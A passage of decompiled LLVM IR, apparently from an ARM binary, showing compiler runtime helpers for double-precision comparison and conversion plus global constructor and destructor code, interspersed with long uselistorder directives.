  uselistorder i32* @r2, { 15, 21, 22, 75, 76, 77, 10, 78, 79, 80, 81, 82, 45, 46, 11, 47, 48, 16, 49, 50, 12, 23, 24, 25, 51, 52, 53, 27, 6, 28, 54, 14, 83, 55, 60, 61, 62, 63, 29, 30, 13, 7, 108, 109, 110, 111, 84, 85, 2, 86, 89, 90, 87, 88, 8, 91, 26, 112, 113, 17, 18, 114, 115, 3, 116, 118, 119, 123, 107, 38, 39, 117, 64, 68, 69, 72, 70, 71, 65, 66, 67, 31, 73, 120, 20, 32, 92, 93, 94, 1, 121, 5, 122, 95, 96, 97, 98, 9, 99, 100, 4, 101, 0, 102, 103, 56, 57, 58, 104, 33, 105, 59, 19, 34, 35, 36, 37, 40, 41, 42, 43, 44, 74, 106 }
  uselistorder label %bb3, { 1, 0 }
}

define i32 @__aeabi_dcmpeq() local_unnamed_addr {
entry:
  %v0_13468 = load i32, i32* @lr, align 4
  %v0_1346c = call i32 @__aeabi_cdcmple()
  %v0_13470 = load i1, i1* @cpsr_z, align 1
  %.v0_1346c. = zext i1 %v0_13470 to i32
  call void @__pseudo_branch(i32 %v0_13468)
  ret i32 %.v0_1346c.
}

define i32 @__aeabi_dcmplt() local_unnamed_addr {
entry:
  %v0_1347c = load i32, i32* @lr, align 4
  %v0_13480 = call i32 @__aeabi_cdcmple()
  %v0_13484 = load i1, i1* @cpsr_c, align 1
  %tmp2 = zext i1 %v0_13484 to i32
  %.v0_13480. = xor i32 %tmp2, 1
  call void @__pseudo_branch(i32 %v0_1347c)
  ret i32 %.v0_13480.
}

define i32 @__aeabi_dcmple() local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v0_13490 = load i32, i32* @lr, align 4
  store i32 %v0_13490, i32* %stack_var_-8, align 4
  %v0_13494 = call i32 @__aeabi_cdcmple()
  %v0_13498 = load i1, i1* @cpsr_z, align 1
  %v1_13498 = load i1, i1* @cpsr_c, align 1
  %v2_13498 = xor i1 %v1_13498, true
  %v3_13498 = or i1 %v0_13498, %v2_13498
  %.v0_13494 = select i1 %v3_13498, i32 1, i32 %v0_13494
  %v2_1349c = xor i1 %v0_13498, true
  %v3_1349c = and i1 %v1_13498, %v2_1349c
  %..v0_13494 = select i1 %v3_1349c, i32 0, i32 %.v0_13494
  %v2_134a0 = load i32, i32* %stack_var_-8, align 4
  call void @__pseudo_branch(i32 %v2_134a0)
  ret i32 %..v0_13494

; uselistorder directives
  uselistorder i1 %v1_13498, { 1, 0 }
  uselistorder i32 ()* @__aeabi_cdcmple, { 2, 1, 0, 3 }
}

define i32 @__aeabi_dcmpge() local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v0_134a4 = load i32, i32* @lr, align 4
  store i32 %v0_134a4, i32* %stack_var_-8, align 4
  %v0_134a8 = call i32 @__aeabi_cdrcmple()
  %v0_134ac = load i1, i1* @cpsr_z, align 1
  %v1_134ac = load i1, i1* @cpsr_c, align 1
  %v2_134ac = xor i1 %v1_134ac, true
  %v3_134ac = or i1 %v0_134ac, %v2_134ac
  %.v0_134a8 = select i1 %v3_134ac, i32 1, i32 %v0_134a8
  %v2_134b0 = xor i1 %v0_134ac, true
  %v3_134b0 = and i1 %v1_134ac, %v2_134b0
  %..v0_134a8 = select i1 %v3_134b0, i32 0, i32 %.v0_134a8
  %v2_134b4 = load i32, i32* %stack_var_-8, align 4
  call void @__pseudo_branch(i32 %v2_134b4)
  ret i32 %..v0_134a8

; uselistorder directives
  uselistorder i1 %v1_134ac, { 1, 0 }
  uselistorder i1 true, { 2, 3, 4, 5, 0, 68, 1, 6, 7, 8, 9, 58, 59, 64, 60, 61, 62, 65, 10, 11, 12, 13, 14, 55, 63, 15, 16, 18, 17, 19, 69, 66, 22, 23, 24, 25, 20, 21, 67, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 41, 42, 39, 40, 43, 44, 54, 70, 45, 46, 47, 56, 48, 49, 50, 51, 57, 52, 53 }
  uselistorder i1* @cpsr_z, { 8, 9, 10, 11, 12, 19, 20, 21, 22, 23, 24, 13, 14, 15, 16, 2, 17, 18, 25, 26, 27, 28, 29, 30, 31, 0, 3, 32, 33, 1, 4, 5, 6, 7 }
}

define i32 @__aeabi_dcmpgt() local_unnamed_addr {
entry:
  %v0_134b8 = load i32, i32* @lr, align 4
  %v0_134bc = call i32 @__aeabi_cdrcmple()
  %v0_134c0 = load i1, i1* @cpsr_c, align 1
  %tmp2 = zext i1 %v0_134c0 to i32
  %.v0_134bc. = xor i32 %tmp2, 1
  call void @__pseudo_branch(i32 %v0_134b8)
  ret i32 %.v0_134bc.

; uselistorder directives
  uselistorder i1 false, { 42, 12, 13, 83, 84, 85, 86, 87, 88, 89, 90, 91, 0, 9, 43, 34, 44, 45, 46, 47, 48, 4, 92, 5, 49, 15, 50, 51, 52, 14, 53, 54, 56, 57, 58, 59, 60, 61, 62, 55, 16, 63, 26, 17, 27, 64, 65, 66, 19, 18, 10, 11, 67, 68, 69, 2, 3, 70, 28, 29, 71, 30, 31, 20, 37, 38, 6, 21, 72, 32, 33, 73, 74, 35, 36, 75, 76, 39, 40, 77, 78, 79, 80, 81, 82, 41, 93, 1, 24, 23, 25, 22, 7, 8, 94, 95, 96, 97 }
  uselistorder i32 ()* @__aeabi_cdrcmple, { 1, 0 }
  uselistorder i32* @lr, { 13, 14, 15, 16, 17, 11, 65, 66, 67, 68, 69, 70, 71, 31, 32, 33, 34, 37, 38, 39, 4, 40, 41, 42, 43, 44, 20, 21, 22, 72, 73, 74, 75, 45, 51, 12, 52, 53, 54, 55, 56, 57, 61, 77, 76, 0, 78, 79, 1, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 5, 116, 117, 118, 6, 119, 120, 121, 7, 122, 123, 124, 125, 126, 127, 128, 129, 47, 80, 82, 84, 85, 8, 87, 88, 86, 103, 104, 105, 130, 30, 131, 132, 133, 23, 24, 25, 26, 58, 59, 60, 134, 35, 36, 89, 90, 62, 63, 64, 46, 27, 48, 49, 91, 92, 93, 94, 95, 96, 97, 10, 9, 2, 98, 99, 100, 101, 3, 102, 83, 18, 19, 50, 81, 28, 29 }
}

define i32 @__fixunsdfsi(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_134cc = icmp slt i32 %arg1, 0
  %v2_134cc = mul i32 %arg1, 2
  br i1 %v1_134cc, label %dec_label_pc_13500, label %dec_label_pc_134d4

dec_label_pc_134d4:                               ; preds = %entry
  %v1_134d4 = add i32 %v2_134cc, 2097152
  %v2_134d4 = icmp ugt i32 %v2_134cc, -2097153
  br i1 %v2_134d4, label %dec_label_pc_13508, label %dec_label_pc_134dc

dec_label_pc_134dc:                               ; preds = %dec_label_pc_134d4
  %v6_134d4 = icmp slt i32 %v1_134d4, 0
  br i1 %v6_134d4, label %dec_label_pc_134e0, label %dec_label_pc_13500

dec_label_pc_134e0:                               ; preds = %dec_label_pc_134dc
  %v4_134e4 = sdiv i32 %v1_134d4, 2097152
  %v5_134e4 = sub nsw i32 -993, %v4_134e4
  %v11_134e4 = icmp slt i32 %v5_134e4, 0
  br i1 %v11_134e4, label %dec_label_pc_13510, label %dec_label_pc_134ec

dec_label_pc_134ec:                               ; preds = %dec_label_pc_134e0
  %v3_134ec = mul i32 %arg1, 2048
  %v4_134f4 = udiv i32 %arg2, 2097152
  %v1_134f0 = or i32 %v3_134ec, %v4_134f4
  %v5_134f4 = or i32 %v1_134f0, -2147483648
  %v6_134f8 = lshr i32 %v5_134f4, %v5_134e4
  ret i32 %v6_134f8

dec_label_pc_13500:                               ; preds = %dec_label_pc_134dc, %entry
  ret i32 0

dec_label_pc_13508:                               ; preds = %dec_label_pc_134d4
  %v4_13508 = mul i32 %arg1, 4096
  %v5_13508 = or i32 %v4_13508, %arg2
  %v7_13508 = icmp eq i32 %v5_13508, 0
  br i1 %v7_13508, label %dec_label_pc_13510, label %dec_label_pc_13518

dec_label_pc_13510:                               ; preds = %dec_label_pc_13508, %dec_label_pc_134e0
  ret i32 -1

dec_label_pc_13518:                               ; preds = %dec_label_pc_13508
  ret i32 0

; uselistorder directives
  uselistorder i32 4096, { 0, 1, 2, 3, 4, 18, 5, 6, 19, 7, 8, 9, 10, 20, 12, 13, 22, 16, 23, 14, 11, 21, 15, 17 }
  uselistorder i32 -2147483648, { 0, 6, 1, 7, 8, 9, 10, 11, 12, 14, 13, 3, 5, 15, 16, 17, 18, 19, 4, 2, 20, 21, 22, 23 }
  uselistorder i32 2048, { 0, 1, 2, 3, 4, 5, 6, 7, 9, 8, 10, 11, 12 }
  uselistorder i32 2097152, { 8, 9, 15, 0, 1, 2, 10, 11, 3, 4, 5, 12, 13, 14, 6, 7 }
  uselistorder i32 2, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 166, 35, 36, 37, 38, 39, 40, 41, 137, 42, 43, 44, 45, 46, 47, 138, 48, 49, 50, 51, 52, 81, 82, 53, 146, 99, 100, 148, 129, 130, 147, 101, 149, 150, 151, 152, 153, 80, 112, 140, 54, 142, 141, 154, 155, 156, 55, 83, 84, 85, 86, 87, 88, 167, 168, 131, 132, 133, 56, 134, 89, 188, 189, 104, 190, 191, 92, 192, 91, 193, 90, 159, 169, 79, 170, 171, 57, 58, 172, 173, 0, 113, 114, 180, 115, 181, 116, 182, 59, 93, 60, 135, 117, 183, 118, 184, 119, 185, 120, 186, 121, 187, 102, 143, 78, 61, 194, 103, 161, 62, 122, 162, 163, 63, 123, 164, 165, 109, 139, 64, 65, 94, 95, 96, 106, 97, 107, 98, 157, 158, 174, 175, 110, 66, 67, 68, 136, 69, 111, 176, 108, 105, 70, 177, 178, 179, 160, 71, 72, 73, 74, 75, 76, 124, 125, 144, 126, 145, 127, 77, 128 }
  uselistorder i32 %arg2, { 1, 0 }
}

define i32 @__do_global_ctors_aux(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_13524 = load i32, i32* @global_var_1e000.625, align 4
  %v7_13528 = icmp eq i32 %v3_13524, -1
  %v3_1352c = load i32, i32* @r4, align 4
  store i32 %v3_1352c, i32* %stack_var_-8, align 4
  store i32 ptrtoint (i32* @global_var_1e000.625 to i32), i32* %r4.global-to-local, align 4
  br i1 %v7_13528, label %bb, label %.preheader

bb:                                               ; preds = %entry
  store i32 %v3_1352c, i32* %r4.global-to-local, align 4
  %v9_13534 = load i32, i32* @r0, align 4
  ret i32 %v9_13534

.preheader:                                       ; preds = %entry, %.preheader
  %v0_1353c = phi i32 [ %v3_13540, %.preheader ], [ %v3_13524, %entry ]
  call void @__pseudo_branch(i32 %v0_1353c)
  %v0_13540 = load i32, i32* %r4.global-to-local, align 4
  %v1_13540 = add i32 %v0_13540, -4
  %v2_13540 = inttoptr i32 %v1_13540 to i32*
  %v3_13540 = load i32, i32* %v2_13540, align 4
  store i32 %v1_13540, i32* %r4.global-to-local, align 4
  %v3_13544 = icmp eq i32 %v3_13540, -1
  br i1 %v3_13544, label %dec_label_pc_1354c, label %.preheader

dec_label_pc_1354c:                               ; preds = %.preheader
  %v2_1354c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_1354c, i32* %r4.global-to-local, align 4
  %v8_1354c = load i32, i32* @r0, align 4
  ret i32 %v8_1354c

; uselistorder directives
  uselistorder i32 %v3_13540, { 1, 0 }
  uselistorder i32 %v3_13524, { 1, 0 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 3, 2, 4 }
  uselistorder i32 -4, { 62, 12, 13, 14, 15, 57, 16, 24, 63, 64, 65, 7, 25, 26, 27, 66, 67, 68, 8, 28, 29, 30, 69, 70, 71, 9, 31, 32, 72, 23, 22, 73, 74, 75, 21, 20, 19, 18, 33, 34, 35, 36, 37, 4, 38, 5, 39, 6, 76, 17, 40, 58, 2, 46, 47, 48, 49, 54, 50, 41, 42, 51, 52, 53, 56, 55, 43, 11, 10, 59, 60, 61, 44, 45, 1, 0, 3 }
  uselistorder i32 -1, { 169, 0, 1, 39, 275, 170, 42, 43, 40, 41, 171, 44, 45, 46, 47, 48, 2, 172, 173, 174, 175, 3, 176, 177, 4, 5, 178, 179, 180, 181, 6, 60, 61, 7, 254, 182, 49, 50, 85, 255, 276, 86, 256, 150, 8, 257, 87, 9, 10, 88, 238, 11, 12, 13, 94, 92, 89, 239, 137, 138, 93, 91, 90, 151, 240, 258, 183, 184, 81, 51, 14, 95, 277, 185, 186, 278, 279, 96, 259, 15, 97, 52, 53, 187, 188, 189, 66, 307, 190, 308, 16, 191, 67, 98, 18, 19, 153, 62, 63, 152, 265, 69, 68, 64, 65, 192, 139, 140, 193, 194, 17, 271, 280, 195, 82, 54, 196, 281, 20, 55, 197, 317, 318, 319, 320, 321, 322, 323, 324, 325, 326, 327, 328, 329, 330, 331, 198, 261, 263, 199, 201, 56, 74, 282, 202, 283, 284, 83, 75, 76, 285, 286, 287, 288, 289, 145, 99, 290, 200, 154, 77, 203, 167, 291, 168, 292, 293, 204, 155, 156, 21, 294, 205, 206, 295, 296, 157, 100, 309, 101, 332, 333, 102, 272, 103, 334, 104, 310, 105, 335, 106, 336, 107, 337, 108, 338, 109, 311, 110, 339, 111, 340, 78, 341, 22, 207, 23, 112, 312, 313, 208, 209, 210, 247, 158, 159, 113, 24, 314, 25, 241, 73, 211, 26, 242, 212, 160, 213, 27, 28, 71, 114, 269, 115, 245, 116, 246, 117, 267, 118, 266, 119, 249, 120, 268, 121, 250, 122, 251, 161, 273, 123, 274, 214, 124, 297, 215, 125, 216, 217, 218, 219, 220, 221, 84, 222, 149, 126, 223, 29, 70, 79, 80, 262, 224, 298, 225, 162, 299, 57, 300, 301, 163, 30, 226, 227, 141, 146, 144, 302, 31, 147, 34, 32, 33, 148, 164, 303, 304, 228, 35, 58, 59, 243, 305, 264, 127, 260, 128, 306, 129, 248, 130, 252, 131, 315, 132, 342, 133, 244, 134, 316, 135, 253, 136, 270, 229, 230, 231, 232, 233, 165, 234, 235, 36, 37, 38, 142, 143, 72, 236, 237, 166 }
  uselistorder i32* @global_var_1e000.625, { 1, 0 }
  uselistorder i32 1, { 521, 261, 434, 449, 522, 450, 523, 435, 997, 998, 999, 524, 272, 274, 273, 277, 278, 271, 276, 275, 1000, 280, 1001, 526, 525, 233, 234, 238, 235, 232, 236, 237, 239, 289, 287, 288, 405, 1002, 1003, 109, 110, 1004, 345, 344, 346, 527, 259, 260, 256, 255, 258, 257, 438, 1005, 1006, 1007, 367, 1008, 368, 1009, 837, 838, 839, 840, 841, 842, 843, 528, 296, 294, 295, 291, 290, 292, 293, 844, 455, 845, 846, 529, 209, 208, 210, 206, 207, 212, 211, 392, 847, 848, 530, 286, 279, 849, 406, 850, 855, 856, 439, 857, 858, 859, 456, 457, 860, 861, 531, 297, 302, 298, 301, 300, 299, 532, 862, 533, 228, 227, 226, 229, 863, 534, 252, 253, 864, 865, 866, 867, 535, 95, 96, 761, 762, 763, 764, 765, 766, 767, 768, 769, 538, 537, 536, 189, 190, 191, 770, 771, 772, 773, 774, 542, 541, 540, 539, 196, 195, 201, 197, 200, 199, 198, 202, 203, 194, 204, 407, 868, 869, 408, 870, 871, 872, 873, 874, 458, 875, 876, 877, 878, 879, 544, 543, 51, 49, 53, 50, 54, 55, 56, 48, 52, 385, 884, 880, 881, 882, 883, 428, 545, 57, 58, 59, 885, 546, 778, 779, 780, 886, 887, 888, 889, 890, 891, 892, 893, 894, 895, 896, 897, 898, 899, 900, 547, 32, 33, 26, 27, 28, 29, 31, 30, 393, 129, 901, 902, 903, 904, 905, 906, 548, 330, 331, 332, 329, 549, 244, 394, 459, 1010, 550, 37, 35, 34, 38, 36, 907, 908, 460, 551, 126, 127, 124, 128, 123, 125, 1011, 1012, 553, 552, 334, 336, 335, 333, 337, 554, 42, 461, 462, 382, 558, 557, 556, 555, 245, 246, 915, 409, 914, 395, 375, 917, 410, 916, 0, 920, 921, 922, 923, 561, 560, 559, 220, 219, 957, 958, 959, 960, 961, 440, 962, 963, 441, 965, 463, 966, 436, 437, 444, 1, 442, 443, 967, 964, 464, 968, 430, 568, 567, 506, 566, 565, 507, 564, 563, 562, 386, 429, 970, 971, 972, 973, 974, 411, 569, 130, 781, 782, 783, 570, 306, 307, 305, 304, 1013, 396, 1014, 1098, 397, 1099, 1100, 1101, 1102, 1103, 1104, 1105, 1106, 1107, 1108, 1109, 1110, 508, 572, 571, 81, 82, 79, 75, 80, 74, 76, 78, 77, 465, 924, 925, 935, 936, 937, 938, 573, 509, 66, 65, 67, 72, 400, 412, 1015, 466, 1016, 1019, 467, 383, 413, 379, 398, 399, 1020, 468, 1021, 1022, 1023, 1024, 414, 1025, 369, 1026, 1027, 469, 1028, 1029, 519, 520, 587, 586, 585, 584, 583, 582, 581, 580, 579, 578, 577, 576, 575, 510, 574, 13, 11, 12, 23, 16, 14, 15, 18, 22, 17, 24, 10, 25, 19, 21, 20, 1030, 1031, 511, 588, 145, 143, 148, 150, 146, 147, 144, 149, 1032, 1033, 1034, 1035, 380, 1036, 1037, 1038, 589, 160, 161, 158, 162, 159, 1044, 1045, 590, 247, 1039, 1040, 1041, 1042, 1043, 137, 136, 133, 135, 132, 131, 138, 134, 1046, 592, 591, 97, 98, 99, 415, 445, 595, 594, 593, 596, 308, 597, 63, 64, 598, 187, 188, 73, 599, 40, 600, 309, 601, 262, 602, 310, 603, 311, 604, 312, 605, 254, 313, 167, 2, 609, 608, 607, 606, 163, 164, 470, 610, 416, 471, 611, 205, 612, 1089, 617, 616, 615, 614, 613, 169, 170, 171, 173, 172, 1090, 1091, 620, 619, 618, 185, 621, 387, 826, 827, 381, 828, 622, 315, 320, 314, 317, 319, 321, 316, 318, 829, 417, 472, 473, 474, 475, 1092, 623, 231, 388, 775, 624, 174, 176, 177, 175, 178, 251, 250, 784, 373, 418, 785, 626, 625, 102, 103, 106, 104, 105, 627, 268, 264, 270, 266, 265, 267, 269, 628, 152, 154, 153, 156, 157, 155, 629, 630, 631, 633, 632, 1111, 419, 636, 635, 634, 323, 322, 637, 241, 242, 240, 243, 90, 91, 92, 93, 638, 70, 71, 69, 68, 639, 640, 325, 324, 420, 969, 641, 192, 193, 642, 326, 643, 61, 644, 60, 645, 62, 646, 41, 647, 327, 648, 39, 649, 328, 650, 151, 476, 975, 384, 976, 977, 477, 996, 654, 653, 652, 651, 139, 141, 142, 140, 655, 656, 658, 657, 359, 360, 358, 1112, 659, 851, 852, 853, 854, 1047, 1048, 660, 338, 401, 1049, 978, 979, 980, 981, 982, 983, 984, 985, 986, 987, 988, 989, 990, 991, 992, 993, 994, 995, 216, 214, 215, 217, 218, 799, 376, 44, 43, 45, 1093, 1094, 1095, 1096, 166, 165, 919, 918, 754, 755, 756, 757, 758, 759, 760, 1116, 85, 86, 83, 84, 1050, 47, 46, 478, 661, 942, 939, 940, 941, 377, 402, 222, 225, 221, 223, 224, 926, 930, 931, 932, 933, 934, 662, 6, 4, 7, 5, 8, 9, 421, 927, 928, 479, 929, 664, 663, 283, 284, 285, 666, 665, 249, 668, 667, 184, 183, 786, 670, 669, 108, 107, 431, 1051, 481, 1052, 1053, 422, 423, 1054, 1055, 482, 1056, 1058, 1059, 1060, 483, 1062, 424, 1063, 1061, 480, 1064, 484, 1065, 432, 1066, 1067, 1057, 674, 673, 672, 671, 111, 114, 117, 115, 113, 112, 118, 116, 119, 120, 1068, 675, 339, 343, 340, 342, 341, 676, 282, 281, 1069, 1070, 1071, 677, 121, 122, 433, 389, 1073, 390, 1074, 425, 1075, 1076, 1078, 378, 1079, 485, 1080, 391, 1077, 427, 685, 684, 683, 682, 681, 680, 679, 678, 179, 180, 181, 182, 486, 403, 686, 87, 88, 89, 1072, 446, 512, 687, 347, 487, 776, 777, 688, 349, 348, 350, 1113, 447, 1114, 1115, 689, 352, 351, 943, 944, 945, 946, 947, 948, 949, 950, 951, 488, 952, 953, 954, 955, 404, 956, 692, 691, 690, 355, 354, 353, 357, 356, 1081, 694, 693, 695, 909, 910, 911, 912, 913, 698, 697, 696, 101, 100, 1082, 699, 94, 700, 186, 701, 230, 702, 366, 213, 703, 303, 704, 361, 705, 706, 362, 707, 248, 448, 1017, 1018, 787, 788, 789, 790, 791, 792, 492, 793, 794, 372, 490, 491, 493, 795, 494, 796, 489, 797, 798, 716, 715, 714, 713, 712, 711, 710, 709, 708, 498, 495, 496, 497, 499, 720, 719, 718, 717, 722, 721, 800, 801, 802, 803, 804, 805, 806, 807, 808, 809, 723, 514, 513, 724, 725, 810, 370, 374, 811, 812, 813, 814, 371, 815, 816, 817, 818, 819, 820, 821, 822, 823, 728, 727, 515, 726, 263, 824, 500, 501, 502, 731, 730, 729, 825, 732, 168, 830, 503, 736, 735, 734, 733, 504, 831, 505, 832, 743, 742, 741, 740, 739, 738, 737, 833, 834, 744, 745, 516, 426, 835, 3, 836, 747, 746, 750, 749, 748, 452, 1083, 1084, 451, 1085, 1086, 453, 454, 1087, 1088, 751, 1097, 517, 752, 753, 365, 364, 363, 518 }
  uselistorder label %.preheader, { 1, 0 }
}

define i32 @call___do_global_ctors_aux() local_unnamed_addr {
entry:
  %v5_13558 = load i32, i32* @r0, align 4
  ret i32 %v5_13558

; uselistorder directives
  uselistorder i32* @r0, { 9, 10, 11, 59, 60, 61, 187, 12, 62, 13, 188, 8, 189, 190, 14, 191, 15, 192, 16, 193, 18, 17, 110, 111, 112, 113, 116, 114, 115, 19, 63, 64, 117, 118, 7, 119, 120, 194, 195, 196, 224, 121, 122, 129, 142, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 72, 73, 74, 75, 23, 24, 140, 26, 198, 199, 27, 200, 202, 203, 28, 29, 226, 227, 228, 49, 229, 30, 50, 51, 230, 231, 55, 56, 57, 58, 31, 32, 33, 34, 52, 232, 233, 102, 225, 35, 76, 77, 78, 79, 80, 81, 65, 66, 67, 68, 105, 106, 36, 37, 176, 38, 175, 82, 53, 83, 39, 177, 178, 179, 180, 181, 182, 183, 184, 185, 22, 21, 204, 205, 206, 25, 134, 135, 136, 137, 138, 139, 40, 130, 131, 132, 133, 84, 141, 85, 207, 208, 209, 3, 41, 210, 211, 4, 6, 0, 1, 212, 213, 5, 214, 215, 216, 42, 217, 218, 219, 2, 220, 201, 69, 70, 71, 234, 235, 143, 144, 145, 146, 147, 148, 149, 150, 221, 222, 123, 124, 125, 126, 127, 128, 20, 86, 43, 197, 44, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 103, 104, 107, 108, 109, 186, 223, 45, 46, 47, 48, 54 }
}

define i32 @_fini() local_unnamed_addr {
entry:
  %v3_13560 = load i32, i32* @r4, align 4
  %v0_13568 = call i32 @__do_global_dtors_aux()
  call void @__pseudo_branch(i32 %v3_13560)
  ret i32 %v0_13568

; uselistorder directives
  uselistorder void (i32)* @__pseudo_branch, { 1, 20, 3, 4, 5, 6, 7, 14, 15, 16, 17, 18, 25, 26, 22, 23, 24, 0, 27, 12, 8, 13, 9, 19, 10, 11, 2, 21 }
  uselistorder i32 0, { 0, 1284, 1, 1285, 1286, 931, 293, 294, 1287, 1288, 1289, 1290, 2, 1291, 1292, 1293, 4, 5, 6, 1294, 1295, 3, 1296, 1297, 7, 1298, 1299, 43, 932, 1300, 1301, 1302, 1303, 1304, 1305, 1306, 1307, 107, 106, 174, 175, 176, 1308, 1309, 1310, 1311, 1312, 1313, 44, 1314, 1315, 1316, 45, 46, 168, 1317, 1318, 1319, 1320, 47, 169, 298, 1321, 1322, 1323, 1324, 1325, 1326, 48, 1327, 9, 8, 49, 933, 1328, 935, 934, 1329, 1330, 1331, 1332, 1333, 1334, 1335, 1336, 1337, 1338, 1339, 1340, 1341, 10, 974, 975, 976, 977, 978, 979, 299, 1342, 936, 11, 1343, 300, 980, 12, 981, 1344, 1345, 937, 13, 1346, 1347, 301, 15, 14, 1348, 1349, 1350, 1351, 1352, 1353, 1354, 938, 939, 1355, 941, 1356, 1357, 942, 943, 1358, 1359, 940, 1360, 944, 1361, 945, 1362, 1363, 1364, 1365, 50, 16, 1366, 1367, 240, 239, 946, 131, 132, 133, 134, 948, 947, 65, 64, 63, 98, 1368, 949, 17, 1369, 1370, 1371, 1372, 135, 1373, 177, 1374, 1375, 1376, 1377, 1378, 1379, 1380, 178, 950, 953, 951, 952, 1381, 1382, 1383, 1384, 1385, 1386, 18, 1387, 1388, 136, 1389, 1390, 1391, 1392, 1393, 179, 954, 957, 955, 956, 1394, 958, 1089, 66, 113, 1090, 1091, 1092, 1093, 1094, 1095, 1104, 1105, 1096, 1097, 1098, 1099, 1100, 1101, 1102, 1103, 1106, 19, 1107, 1108, 1109, 959, 1110, 1395, 1396, 1122, 302, 303, 1113, 1114, 180, 1115, 1116, 1118, 1117, 1119, 1120, 271, 1121, 170, 171, 172, 1123, 1111, 1112, 99, 100, 1124, 1126, 1127, 1125, 1128, 1129, 1130, 1131, 123, 1132, 1133, 124, 1134, 125, 1135, 126, 1136, 183, 982, 181, 983, 984, 985, 182, 986, 114, 115, 987, 184, 988, 304, 51, 305, 989, 990, 272, 185, 306, 307, 991, 186, 1137, 1138, 1139, 1141, 187, 1140, 244, 308, 1142, 309, 67, 68, 69, 70, 145, 146, 188, 189, 1143, 147, 1144, 279, 278, 277, 20, 120, 71, 1002, 1003, 1145, 1146, 1004, 275, 1397, 190, 1147, 1148, 1149, 1150, 1151, 1398, 1399, 52, 1400, 1401, 148, 1402, 1403, 191, 1152, 1153, 1154, 21, 1155, 1156, 1404, 192, 1405, 1406, 1407, 1408, 1409, 1410, 1157, 1639, 193, 22, 23, 1640, 1641, 1642, 1643, 310, 280, 1158, 1165, 1166, 311, 1167, 1168, 1169, 1170, 1171, 1172, 1173, 1174, 72, 1176, 1175, 116, 1196, 1197, 312, 1235, 1217, 1218, 1219, 25, 24, 282, 269, 270, 276, 1220, 1221, 1223, 1224, 149, 241, 1227, 313, 1229, 1231, 26, 1233, 1234, 1236, 314, 283, 1225, 1222, 1238, 1239, 194, 1240, 1241, 27, 1251, 1252, 1253, 1254, 196, 195, 1255, 197, 1005, 1006, 28, 960, 1411, 73, 150, 1412, 1413, 245, 29, 961, 247, 1414, 74, 151, 1415, 1416, 246, 1663, 1664, 1665, 1666, 1669, 1670, 1671, 1672, 1673, 1674, 1675, 1676, 1667, 1668, 1677, 1678, 1679, 1680, 1681, 1682, 1683, 1684, 53, 1685, 1686, 1687, 1688, 54, 1689, 1690, 55, 1691, 1692, 56, 1693, 1694, 1695, 1696, 1697, 1698, 1699, 1700, 1701, 1702, 1703, 1704, 1705, 1706, 1709, 1710, 1711, 1712, 1713, 1714, 1715, 1716, 1707, 1708, 1717, 1718, 1719, 1720, 1721, 1722, 1723, 1724, 57, 1725, 1726, 1727, 1728, 58, 1729, 1730, 1731, 1732, 59, 1733, 1734, 1735, 1736, 1737, 1738, 1739, 1740, 1741, 1742, 1743, 1744, 1177, 1178, 1189, 315, 316, 1190, 1191, 1417, 1418, 1419, 1420, 1421, 1422, 1423, 1424, 1425, 1426, 1427, 1428, 1429, 1430, 1440, 198, 1441, 1442, 1443, 1444, 1445, 1446, 1447, 1448, 1449, 1450, 1451, 1452, 1453, 1454, 1455, 1456, 60, 1457, 1458, 1459, 1460, 1461, 1462, 1463, 152, 122, 1464, 1465, 199, 200, 1466, 1467, 1468, 1469, 201, 1470, 1471, 1472, 1473, 1474, 1475, 1476, 1477, 1478, 61, 1479, 1480, 1481, 1482, 1483, 1484, 1485, 1486, 1487, 273, 1488, 75, 202, 1489, 153, 317, 1490, 1491, 1492, 1493, 1494, 1495, 62, 1496, 1497, 1498, 1499, 1500, 1501, 1502, 318, 1503, 1504, 1505, 1506, 203, 1507, 1508, 1509, 1510, 1511, 1512, 1513, 1514, 1515, 204, 1516, 927, 1517, 1518, 1519, 928, 1520, 1521, 1522, 1523, 1524, 1525, 1526, 1527, 1528, 30, 1529, 1530, 1531, 962, 1532, 1533, 1534, 1535, 1536, 1537, 1539, 1538, 1540, 1541, 1542, 1543, 1544, 1545, 1546, 1547, 1548, 1549, 1550, 1551, 1552, 1556, 1557, 154, 1553, 1554, 31, 1555, 248, 1558, 249, 1559, 1560, 155, 1561, 1644, 1745, 1256, 1257, 1258, 1259, 1746, 137, 1747, 1645, 1748, 1749, 1750, 1751, 1646, 1752, 1753, 1754, 1755, 1756, 205, 1757, 129, 1758, 127, 128, 1759, 1760, 1761, 319, 320, 321, 1765, 322, 1771, 1776, 963, 250, 1777, 323, 1775, 324, 325, 32, 1762, 1763, 206, 1647, 281, 1648, 328, 285, 284, 1649, 1650, 1651, 1652, 327, 1653, 1654, 326, 1655, 1656, 207, 1764, 1065, 1066, 1067, 1068, 1069, 1070, 209, 156, 1071, 1072, 1073, 130, 208, 1074, 210, 1657, 1658, 329, 1659, 330, 992, 157, 993, 158, 994, 211, 1007, 1008, 1009, 1010, 33, 1084, 1085, 34, 995, 996, 964, 101, 997, 295, 998, 332, 1766, 333, 286, 1767, 1768, 1769, 1770, 331, 1262, 1264, 1265, 76, 251, 1266, 1263, 1260, 1261, 35, 1011, 1014, 1012, 1013, 252, 36, 1244, 1242, 1243, 253, 212, 1015, 1016, 1017, 1018, 1267, 1268, 334, 37, 1269, 213, 1245, 1246, 1247, 1248, 1249, 1250, 1232, 1047, 929, 1060, 930, 1228, 1226, 1077, 1230, 1078, 1079, 1270, 1271, 214, 1272, 1276, 1277, 1278, 1279, 335, 1280, 1281, 1282, 1772, 215, 216, 217, 1562, 1563, 